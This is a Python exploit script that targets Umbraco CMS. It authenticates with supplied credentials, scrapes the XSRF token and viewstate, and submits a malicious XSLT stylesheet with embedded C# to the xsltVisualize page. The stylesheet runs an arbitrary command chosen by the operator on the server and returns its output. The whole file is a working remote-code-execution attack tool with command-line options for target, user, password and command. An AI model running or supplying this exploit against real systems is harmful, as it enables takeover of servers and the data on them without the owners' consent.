import argparse
import requests
import re
import sys
#import lxml.html
from bs4 import BeautifulSoup
from log_colors import *
requests.packages.urllib3.disable_warnings()

class UmbracoCMSRCE:
    
    def __init__(self, url, user, pswd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.session = requests.Session()

    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        print (LogColors.YELLOW + str(self.user) + ":" + str(self.pswd) + LogColors.ENDC)
        url = self.url + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
        data = {"username" : self.user, "password" : self.pswd}
        r = self.session.post(url, json = data)

    def get_xsrf(self):
        print (LogColors.BLUE + "get xsrf token and params..." + LogColors.ENDC)
        url = self.url + "/umbraco/developer/Xslt/xsltVisualize.aspx"
        r = self.session.get(url)
        xsrf = self.session.cookies["UMB-XSRF-TOKEN"]
        #tree = lxml.html.fromstring(r.text)
        soup = BeautifulSoup(r.text, 'html.parser')
        viewstate = soup.find(id = "__VIEWSTATE")['value']
        viewstategenerator = soup.find(id = "__VIEWSTATEGENERATOR")['value']
        self.xsrf = xsrf
        print (LogColors.YELLOW + xsrf + LogColors.ENDC)
        return xsrf, viewstate, viewstategenerator

    def exploit(self, arguments, cmd):
        self.login()
        xsrf, viewstate, viewstategenerator = self.get_xsrf()
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        url = self.url + "/umbraco/developer/Xslt/xsltVisualize.aspx"
        payload = '<?xml version="1.0"?>'
        payload += '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">'
        payload += '<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s";' % arguments
        payload += 'System.Diagnostics.Process proc = new System.Diagnostics.Process();'
        payload += ' proc.StartInfo.FileName = "%s";' % cmd
        payload += ' proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false;'
        payload += ' proc.StartInfo.RedirectStandardOutput = true;'
        payload += ' proc.Start(); string output = proc.StandardOutput.ReadToEnd();'
        payload += ' return output; }  '
        payload += '</msxsl:script><xsl:template match="/">'
        payload += '<xsl:value-of select="csharp_user:xml()"/>'
        payload += ' </xsl:template> </xsl:stylesheet>'
        print (LogColors.YELLOW + str(arguments) + LogColors.ENDC)
        print (LogColors.YELLOW + str(cmd) + LogColors.ENDC)
        headers = {"UMB-XSRF-TOKEN" : xsrf}
        data = {
            "__EVENTTARGET" : "", "__EVENTARGUMENT" : "",
            "__VIEWSTATE" : viewstate,
            "__VIEWSTATEGENERATOR" : viewstategenerator,
            "ctl00$body$xsltSelection": payload,
            "ctl00$body$contentPicker$ContentIdValue": "",
            "ctl00$body$visualizeDo": "Visualize+XSLT"
        }
        r = self.session.post(url, data = data, headers = headers)
        print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)
        if r.ok:
            soup = BeautifulSoup(r.text, "html.parser")
            #print (r.text)
            result = soup.find(id = "result").getText()
            print (LogColors.YELLOW + "result:" + LogColors.ENDC)
            print (LogColors.YELLOW + result + LogColors.ENDC)
            print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to send payload :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target url")
    parser.add_argument('-u','--user', required = True, help = "username")
    parser.add_argument('-p','--pass', required = True, help = "password")
    parser.add_argument('-c','--cmd', required = True, help = "command")
    parser.add_argument('-a','--args', required = False, default = '', help = "arguments")
    args = vars(parser.parse_args())
    url = args['target']
    usr, pswd = args['user'], args['pass']
    cmd, arguments = args['cmd'], args['args']
    cve = UmbracoCMSRCE(url, usr, pswd)
    cve.exploit(arguments, cmd)

